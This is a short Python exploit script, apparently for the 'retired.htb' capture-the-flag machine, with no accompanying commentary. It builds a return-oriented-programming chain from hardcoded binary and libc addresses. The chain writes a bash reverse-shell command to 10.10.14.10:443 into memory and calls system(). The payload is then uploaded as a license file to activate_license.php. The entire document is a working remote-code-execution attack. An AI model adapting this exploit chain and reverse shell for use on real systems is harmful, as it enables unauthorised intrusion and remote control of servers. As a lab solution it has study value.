#!/usr/bin/python3
from pwn import p64
import requests

offset = 520
junk = b"A" * offset

binary_base = 0x564086262000
libc_base = 0x7f82a824f000

offset_writable = 0x00004000
offset_system = 0x0000000000048e50
offset_pop_rdi = 0x0000000000026796
offset_pop_rsi = 0x000000000002890f
offset_mov_rdi_rsi = 0x00000000000603b2

writable = binary_base + offset_writable

system = p64(libc_base + offset_system)
pop_rdi = p64(libc_base + offset_pop_rdi)
pop_rsi = p64(libc_base + offset_pop_rsi)
mov_rdi_rsi = p64(libc_base + offset_mov_rdi_rsi)

command = b"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"

payload =  b""
payload += junk

for i in range(0, len(command), 8):
    payload += pop_rdi + p64(writable + i)
    payload += pop_rsi + command[i:i+8].ljust(8, b"\x00")
    payload += mov_rdi_rsi

payload += pop_rdi + p64(writable)
payload += system

requests.post("http://retired.htb/activate_license.php", files={"licensefile": payload})
